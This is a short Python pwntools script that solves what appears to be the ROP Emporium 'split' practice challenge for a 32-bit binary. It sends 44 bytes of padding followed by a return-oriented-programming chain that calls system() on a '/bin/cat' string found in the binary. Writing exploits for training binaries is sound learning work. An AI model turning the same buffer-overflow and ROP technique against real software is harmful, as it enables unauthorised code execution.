from pwn import *

elf = context.binary = ELF('./split32', checksec=False)
context.log_level = 'debug'

io = process()

# Initialize ROP object and chain
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/cat')))

payload = flat(
	b'A' * 44,
	rop.chain()
)

io.sendline(payload)
io.interactive()